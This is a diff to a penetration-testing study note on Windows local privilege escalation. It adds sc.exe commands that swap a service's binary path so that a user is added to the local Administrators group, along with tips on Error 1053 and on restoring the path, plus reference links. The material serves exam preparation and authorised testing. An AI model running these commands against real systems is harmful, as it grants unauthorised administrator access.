@@ -31,6 +31,18 @@ Writable by: Users
 
 Run WinPEAS from a controlled local transfer and save only the useful findings.
 
+**Server Operators, binary path swap**
+
+```cmd
+sc.exe config $ServiceName binPath= "cmd.exe /c net localgroup administrators $Username /add"
+sc.exe start $ServiceName
+sc.exe config $ServiceName binPath= "C:\Windows\system32\<original>.exe"
+sc.exe qc $ServiceName
+net localgroup administrators
+```
+
+Error 1053 is expected when the replacement is not a proper service binary. The command can still execute before the timeout. Restore the original path immediately, then start a new logon session before expecting the group membership to appear in the token.
+
 ## Gotcha
 
 > [!warning] 💡
@@ -38,3 +50,8 @@ Run WinPEAS from a controlled local transfer and save only the useful findings.
 
 > [!warning]
 > Command not yet verified against a real box. Confirm the exact WinPEAS invocation and `Get-Acl` syntax before relying on this in an exam.
+
+## External Resources
+
+- [HackTricks, Windows Local Privilege Escalation](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html)
+- [Microsoft, sc.exe config](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config)
